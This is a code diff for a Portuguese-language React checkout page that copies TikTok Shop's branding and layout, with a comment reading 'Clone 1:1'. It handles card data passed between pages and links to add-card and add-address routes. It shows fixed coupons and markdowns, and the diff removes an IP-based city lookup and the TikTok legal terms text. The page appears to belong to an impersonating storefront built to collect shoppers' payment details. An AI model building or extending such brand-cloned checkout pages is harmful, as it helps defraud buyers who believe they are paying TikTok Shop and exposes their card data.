@@ -19,14 +19,15 @@ import { Product } from '@/data/products';
 import { Button } from '@/components/ui/button';
 import NoteDrawer from '@/components/NoteDrawer';
 import TikTokCouponDrawer from '@/components/TikTokCouponDrawer';
+import PaymentMethodDrawer from '@/components/PaymentMethodDrawer';
 
 const Checkout: React.FC = () => {
   const location = useLocation();
   const navigate = useNavigate();
   const [product, setProduct] = useState<Product | null>(null);
-  const [locationStr, setLocationStr] = useState("Buscando sua cidade...");
   const [isNoteDrawerOpen, setIsNoteDrawerOpen] = useState(false);
   const [isCouponDrawerOpen, setIsCouponDrawerOpen] = useState(false);
+  const [isPaymentDrawerOpen, setIsPaymentDrawerOpen] = useState(false);
   const [orderNote, setOrderNote] = useState("");
   const [quantity, setQuantity] = useState(1);
   const [couponAmount, setCouponAmount] = useState(5);
@@ -44,19 +45,6 @@ const Checkout: React.FC = () => {
       setCardData(location.state.cardData);
       setPaymentMethod('card');
     }
-
-    // Busca localização real por IP (Cidade e Estado)
-    fetch('https://freeipapi.com/api/json')
-      .then(res => res.json())
-      .then(data => {
-        if (data.cityName && data.regionName) {
-          // Formato: Cidade, SiglaEstado (ou NomeEstado)
-          setLocationStr(`${data.cityName}, ${data.regionName}`);
-        } else {
-          setLocationStr("São Paulo, SP");
-        }
-      })
-      .catch(() => setLocationStr("São Paulo, SP"));
   }, [location, navigate]);
 
   if (!product) return null;
@@ -67,6 +55,7 @@ const Checkout: React.FC = () => {
   const originalSubtotal = originalUnitPrice * quantity;
   const discountTotal = originalSubtotal - subtotal;
   const finalTotal = subtotal - couponAmount;
+  const finalTotalStr = finalTotal.toFixed(2).replace('.', ',');
 
   return (
     <div className="min-h-screen bg-[#F8F8F8] pb-[130px]">
@@ -87,16 +76,15 @@ const Checkout: React.FC = () => {
       </div>
 
       <div className="max-w-[600px] mx-auto">
-        {/* Endereço com Localização Real Dinâmica */}
+        {/* Endereço Simplificado */}
         <div className="bg-white p-4 flex items-center justify-between border-b border-gray-100">
           <div className="flex items-center space-x-2">
             <MapPin size={18} className="text-gray-900" />
-            <div>
-              <span className="text-[14px] text-gray-900 font-medium">Endereço de envio</span>
-              <p className="text-[12px] text-gray-400 font-normal">{locationStr}</p>
-            </div>
+            <span className="text-[14px] text-gray-900 font-medium">Endereço de envio</span>
           </div>
-          <button className="text-[#FF2C55] text-[14px] font-medium">+ Adicionar endereço</button>
+          <button className="text-[#FF2C55] text-[14px] font-medium" onClick={() => navigate('/adicionar-endereco')}>
+            + Adicionar endereço
+          </button>
         </div>
 
         {/* Cupom TikTok Shop */}
@@ -116,9 +104,37 @@ const Checkout: React.FC = () => {
           </div>
         </div>
 
-        {/* Resumo do Pedido Detalhado */}
+        {/* Detalhes do Produto */}
         <div className="bg-white mt-3 p-4">
-          <h3 className="text-[14px] font-bold text-gray-900 mb-4">Resumo do Pedido</h3>
+          <div className="flex justify-between items-center mb-4">
+            <h3 className="text-[14px] font-bold text-gray-900">Resumo do Pedido</h3>
+          </div>
+          <div className="flex space-x-3 mb-4">
+            <div className="w-[80px] h-[80px] bg-gray-50 rounded-lg overflow-hidden border p-1">
+              <img src={product.media[0].src} className="w-full h-full object-contain" alt="Thumb" />
+            </div>
+            <div className="flex-grow flex flex-col justify-between py-0.5">
+              <h4 className="text-[13px] font-medium text-gray-900 line-clamp-2 leading-tight">{product.title}</h4>
+              <div className="flex justify-between items-end">
+                 <div className="flex flex-col">
+                   <div className="flex items-center space-x-1">
+                     <span className="text-[15px] font-bold text-[#FF2C55]">R$ {unitPrice.toFixed(2).replace('.', ',')}</span>
+                     <Ticket size={12} className="text-[#FF2C55] fill-[#FF2C55]" />
+                   </div>
+                   <span className="text-[11px] text-gray-400 line-through">R$ {originalUnitPrice.toFixed(2).replace('.', ',')}</span>
+                 </div>
+                 <div className="flex items-center bg-[#F1F1F1] rounded-sm h-7">
+                    <button className="w-8 flex items-center justify-center text-gray-500" onClick={() => setQuantity(q => Math.max(1, q - 1))}><Minus size={14} /></button>
+                    <span className="w-8 text-center text-[13px] font-medium border-x border-white">{quantity}</span>
+                    <button className="w-8 flex items-center justify-center text-gray-500" onClick={() => setQuantity(q => q + 1)}><Plus size={14} /></button>
+                 </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        {/* Resumo de Preços */}
+        <div className="bg-white mt-3 p-4">
           <div className="space-y-3.5">
             <div className="flex justify-between items-center">
               <div className="flex items-center space-x-1.5">
@@ -142,14 +158,14 @@ const Checkout: React.FC = () => {
             <div className="pt-2 border-t flex flex-col items-end">
               <div className="flex items-center space-x-4 w-full justify-between mt-1">
                 <span className="text-[16px] font-bold text-gray-900 uppercase">Total</span>
-                <span className="text-[16px] font-bold text-gray-900">R$ {finalTotal.toFixed(2).replace('.', ',')}</span>
+                <span className="text-[16px] font-bold text-gray-900">R$ {finalTotalStr}</span>
               </div>
               <span className="text-[11px] text-gray-400 mt-0.5">Impostos inclusos</span>
             </div>
           </div>
         </div>
 
-        {/* Forma de Pagamento Clone 1:1 */}
+        {/* Forma de Pagamento */}
         <div className="bg-white mt-3 p-4">
           <h3 className="text-[14px] font-bold text-gray-900 mb-5">Forma de pagamento</h3>
           
@@ -170,7 +186,6 @@ const Checkout: React.FC = () => {
                       Sem juros em até 3 parcelas <ChevronRight size={10} className="ml-1" />
                     </div>
                   </div>
-                  <span className="text-[12px] text-gray-400 mt-1">Pague em até 12 parcelas</span>
                 </div>
               </div>
               <ChevronRight size={18} className="text-gray-300 mt-1" />
@@ -188,18 +203,13 @@ const Checkout: React.FC = () => {
               </div>
             </div>
 
-            <div className="flex items-center justify-between border-t pt-4">
+            <div className="flex items-center justify-between border-t pt-4" onClick={() => setIsPaymentDrawerOpen(true)}>
               <img src="https://images.seeklogo.com/logo-png/32/1/google-pay-logo-png_seeklogo-324563.png" className="h-4" alt="GPay" />
               <button className="flex items-center text-[13px] font-bold text-gray-900">
                 Ver todos <ChevronRight size={16} className="ml-1" />
               </button>
             </div>
           </div>
-        </div>
-
-        {/* Termos Legais */}
-        <div className="p-4 text-[11px] text-gray-500 leading-tight">
-          Ao fazer um pedido, você concorda com <span className="font-bold text-gray-900">Termos de uso e venda do TikTok Shop</span> e reconhece que leu e concordou com a <span className="font-bold text-gray-900">Política de privacidade do TikTok</span>.
         </div>
 
         {/* Faixa de Economia */}
@@ -216,7 +226,7 @@ const Checkout: React.FC = () => {
         <div className="max-w-[600px] mx-auto">
           <div className="flex justify-between items-center mb-2 px-1">
             <span className="text-[15px] font-bold text-gray-900">Total (1 item)</span>
-            <span className="text-[18px] font-bold text-[#FF2C55]">R$ {finalTotal.toFixed(2).replace('.', ',')}</span>
+            <span className="text-[18px] font-bold text-[#FF2C55]">R$ {finalTotalStr}</span>
           </div>
           <Button 
             className="w-full bg-[#FF2C55] hover:bg-[#E0254B] text-white font-bold rounded-full h-[52px] flex flex-col items-center justify-center border-none shadow-none space-y-0"
@@ -230,6 +240,13 @@ const Checkout: React.FC = () => {
 
       <NoteDrawer isOpen={isNoteDrawerOpen} onClose={() => setIsNoteDrawerOpen(false)} onSave={setOrderNote} initialNote={orderNote} />
       <TikTokCouponDrawer isOpen={isCouponDrawerOpen} onClose={() => setIsCouponDrawerOpen(false)} onSelect={setCouponAmount} selectedAmount={couponAmount} />
+      <PaymentMethodDrawer 
+        isOpen={isPaymentDrawerOpen} 
+        onClose={() => setIsPaymentDrawerOpen(false)} 
+        onSelectMethod={setPaymentMethod} 
+        onAddCard={() => navigate('/adicionar-cartao')}
+        total={finalTotalStr}
+      />
     </div>
   );
 };
